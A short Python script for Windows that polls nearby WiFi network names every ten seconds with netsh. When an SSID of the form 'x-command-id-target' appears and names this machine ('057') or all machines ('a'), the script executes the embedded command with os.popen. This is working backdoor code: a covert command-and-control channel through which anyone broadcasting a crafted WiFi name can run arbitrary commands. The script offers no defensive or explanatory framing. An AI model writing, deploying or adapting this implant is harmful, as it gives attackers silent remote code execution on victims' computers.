import os
import subprocess
import time


ids=[]
pc='057'


def get_networks():
  net=[]
  nw = subprocess.check_output(['netsh','wlan','show','network'])
  dec = nw.decode('ascii')
  gx = dec.split('\r\n')
  for i in gx:
    if i[0:4] == 'SSID':
      net.append(i[9:])
  return net

def net_to_command(networks):
  for i in networks:
    if i[:2]=='x-':
      return(i[2:])

def exec(command_and_id):
  if command_and_id != None:
    command_id=str(command_and_id).split('-')
    if command_id[2] == 'a' or command_id[2] == pc:
      if command_id[1] not in ids:
        os.popen(command_id[0])
        ids.append(command_id[1])

def runner_wifi():
  networks=get_networks()
  command_and_id = net_to_command(networks)
  exec(command_and_id)
  print(command_and_id,time.ctime())

while(True):
  runner_wifi()
  time.sleep(10)